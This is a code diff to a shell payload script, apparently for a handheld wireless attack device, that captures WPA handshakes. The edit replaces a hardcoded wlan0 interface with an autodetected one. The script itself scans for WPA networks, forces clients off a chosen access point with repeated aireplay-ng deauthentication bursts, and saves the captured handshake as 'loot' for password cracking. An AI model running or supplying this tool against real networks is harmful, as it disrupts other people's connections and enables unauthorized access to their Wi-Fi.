@@ -4,6 +4,11 @@
 # Description: Targeted WPA handshake capture
 # Category: nullsec/capture
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/handshakes"
 mkdir -p "$LOOT_DIR"
 
@@ -19,8 +24,6 @@ Options:
 
 Press OK to configure."
 
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
-
 PROMPT "SELECT TARGET:
 
 1. Scan and select
@@ -32,7 +35,7 @@ MODE=$(NUMBER_PICKER "Mode (1-2):" 1)
 
 if [ "$MODE" -eq 1 ]; then
     SPINNER_START "Scanning..."
-    timeout 10 airodump-ng wlan0 --encrypt wpa --write-interval 1 -w /tmp/hsscan --output-format csv 2>/dev/null
+    timeout 10 airodump-ng $IFACE --encrypt wpa --write-interval 1 -w /tmp/hsscan --output-format csv 2>/dev/null
     SPINNER_STOP
     
     NET_COUNT=$(grep -c "WPA" /tmp/hsscan*.csv 2>/dev/null || echo 0)
@@ -82,10 +85,10 @@ Press OK to hunt.")
 LOG "Hunting handshake..."
 
 # Lock channel
-iwconfig wlan0 channel $CHANNEL
+iwconfig $IFACE channel $CHANNEL
 
 # Start capture
-airodump-ng wlan0 --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
+airodump-ng $IFACE --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
 CAP_PID=$!
 
 sleep 3
@@ -94,7 +97,7 @@ sleep 3
 case $METHOD in
     2) # Deauth all
         for i in 1 2 3; do
-            aireplay-ng -0 5 -a "$BSSID" wlan0 2>/dev/null
+            aireplay-ng -0 5 -a "$BSSID" $IFACE 2>/dev/null
             sleep 10
             
             # Check for handshake
@@ -106,7 +109,7 @@ case $METHOD in
         ;;
     3) # Target client
         for i in 1 2 3; do
-            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" wlan0 2>/dev/null
+            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" $IFACE 2>/dev/null
             sleep 10
             
             if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
